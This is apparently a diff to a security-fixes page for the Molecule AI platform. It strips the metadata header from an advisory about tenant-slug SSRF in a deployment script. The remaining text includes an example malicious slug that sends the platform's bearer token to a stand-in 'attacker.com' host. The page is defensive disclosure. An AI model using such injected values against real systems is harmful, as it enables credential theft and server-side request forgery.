@@ -9,14 +9,7 @@ This page documents security fixes shipped in the Molecule AI platform. Each ent
 
 ---
 
-## 2026-05-14 — CWE-918 + CWE-20: Tenant-Slug SSRF and Bearer-Token Exfiltration in `promote-tenant-image.sh`
-
-**Severity:** High (CWE-918 SSRF + CWE-20 Improper Input Validation)
-**PR:** [#933](https://git.moleculesai.app/molecule-ai/molecule-core/pull/933)
-**Affected:** `scripts/promote-tenant-image.sh`
-**SaaS impact:** None — platform applies the fix server-side
-
-### Vulnerability
+## Vulnerability
 
 `promote-tenant-image.sh` interpolated tenant slugs directly into URL paths and ECR repository identifiers without validation. A malicious slug such as `?url=https://attacker.com&token=$CP_TOKEN` could cause the platform to redirect HTTP calls to an attacker-controlled host (SSRF) and expose the platform's bearer token in the attacker's server access logs via the same URL parameter injection.
 
